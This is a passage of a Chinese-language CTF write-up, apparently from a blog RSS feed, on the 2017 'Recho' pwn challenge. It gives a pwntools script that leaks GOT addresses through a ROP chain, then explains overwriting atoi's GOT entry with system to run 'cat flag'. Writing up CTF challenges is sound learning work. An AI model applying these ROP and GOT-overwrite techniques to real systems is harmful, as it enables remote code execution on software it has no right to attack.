class="section">else:</span></div><div class="line">    p = remote(<span class="string">"recho.2017.teamrois.cn"</span>, 9527)</div><div class="line">e = ELF('Recho')</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line">padding = 0x38*'a'          <span class="comment">#padding</span></div><div class="line"><span class="comment"># write(1, got['read'], 8)</span></div><div class="line">payload = <span class="string">""</span></div><div class="line">payload += p64(0x4008a3)  <span class="comment"># pop rdi;ret</span></div><div class="line">payload += p64(1)         <span class="comment"># rdi = 1</span></div><div class="line">payload += p64(0x4008a1)  <span class="comment"># pop rsi; pop r15; ret</span></div><div class="line">payload += p64(e.got['read'])  <span class="comment"># rsi = got.plt read</span></div><div class="line">payload += p64(0)         <span class="comment"># r15 = 0</span></div><div class="line">payload += p64(0x4006fe)  <span class="comment"># pop rdx;ret</span></div><div class="line">payload += p64(8)         <span class="comment"># rdx = 8</span></div><div class="line">payload += p64(e.symbols['write'])  <span class="comment"># call write</span></div><div class="line"><span class="comment"># write(1, got['write'], 8)</span></div><div class="line">payload += p64(0x4008a3)  <span class="comment"># pop rdi;ret</span></div><div class="line">payload += p64(1)         <span class="comment"># rdi = 1</span></div><div class="line">payload += p64(0x4008a1)  <span class="comment"># pop rsi; pop r15; ret</span></div><div class="line">payload += p64(e.got['atoi'])  <span class="comment"># rsi = got.plt atoi</span></div><div class="line">payload += p64(0)         <span class="comment"># r15 = 0</span></div><div class="line">payload += p64(0x4006fe)  <span class="comment"># pop rdx;ret</span></div><div class="line">payload += p64(8)         <span class="comment"># rdx = 8</span></div><div class="line">payload += p64(e.symbols['write'])  <span class="comment"># call write</span></div><div class="line"></div><div class="line"></div><div class="line">p.readuntil(<span class="string">"server!\n"</span>)</div><div class="line">p.sendline('1000')</div><div class="line">p.sendline(padding + payload)</div><div class="line">p.recv()</div><div class="line">p.sock.shutdown(1)</div><div class="line">print u64(p.recv(8)) - u64(p.recv(8))</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>经过远程和本地测试对比，发现远程的libc应该和我本地的一样</p>
<p>然后使用本地的libc写payload就好了。。</p>
<p>思路是改写got表中随便一个函数的地址改成system就好了，比如我修改的是atoi函数，然后找binary中的ROP，找到下面三个：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span><span class="comment">; ret;</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">rax</span><span class="comment">; ret;</span></div><div class="line"><span class="keyword">add</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span><span class="comment">; ret;</span></div></pre></td></tr></table></figure>
<p>通过这三个，我们就能修改偏移了，比如:</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4008a3)</span>+p<span class="number">64</span><span class="comment">(0x601040)</span>    <span class="attr"># pop rdi; ret;   rdi = 0</span>x<span class="number">601040</span>; atoi</div><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4006fc)</span>+p<span class="number">64</span><span class="comment">(0x10)</span> + p<span class="number">64</span><span class="comment">(0x40070d)</span>  <span class="attr"># pop rax; ret;   rax = 0</span>x<span class="number">10</span>; add [rdi], al; ret;</div><div class="line"></div><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4008a3)</span>+p<span class="number">64</span><span class="comment">(0x601041)</span>    <span class="attr"># pop rdi; ret;   rdi = 0</span>x<span class="number">601041</span>;</div><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4006fc)</span>+p<span class="number">64</span><span class="comment">(229)</span> + p<span class="number">64</span><span class="comment">(0x40070d)</span>   <span class="attr"># pop rax; ret;   rax=0</span>xe<span class="number">5</span>;   add [rdi], al; ret;</div></pre></td></tr></table></figure>
<p>这相当于got表中atoi函数的地址加上0xe510</p>
<p>同样再使用上面的ROP往bss中写入<code>cat flag</code>，最后输出的指令是<code>system(&#39;cat flag&#39;)</code></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本以为栈溢出都会了，其实还是太菜…..</p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/05/23/0x33/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
